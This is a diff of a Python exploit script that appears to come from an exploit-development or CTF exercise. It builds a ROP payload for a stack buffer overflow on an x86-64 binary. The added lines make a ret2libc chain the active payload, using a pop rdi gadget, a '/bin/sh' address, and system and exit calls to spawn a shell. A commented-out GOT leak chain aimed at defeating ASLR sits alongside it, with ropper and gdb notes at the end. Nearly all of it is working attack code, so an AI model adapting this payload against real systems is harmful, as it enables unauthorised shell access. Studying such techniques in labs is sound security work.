@@ -57,11 +57,24 @@ rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
 # 0x0000000000401201: pop rsi; pop r15; ret;
 double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
 
+puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
+
+flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
+copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
+
 
 payload = (
     buffer
-    + backup_base_pointer
-    + rop_puts  # works with aslr.
+    + backup_base_pointer  # for padding.
+    + rop_pop_rdi_ret
+    + bin_sh_string
+    + system_call
+    + exit_call
+
+    # + rop_pop_rdi_ret
+    # + puts_got
+    # + rop_puts  # works with aslr.
+    # + flush_got
     # + rop_pop_rdi_ret  # works with aslr.
     # + bin_sh_string  # broken by aslr.
     # + system_call  # broken by aslr.
@@ -126,3 +139,5 @@ f.write(payload)
 # ropper --file /usr/lib/x86_64-linux-gnu/libc-2.33.so --search 'push rsp' -I 0x7ffff7dd6000
 # -I defines the imagebase (via: i proc m)
 # neat, but won't help with ASLR (because imagebase changes each time)
+
+# x/s 0x007fffffffd300 # 4 ohne aslr
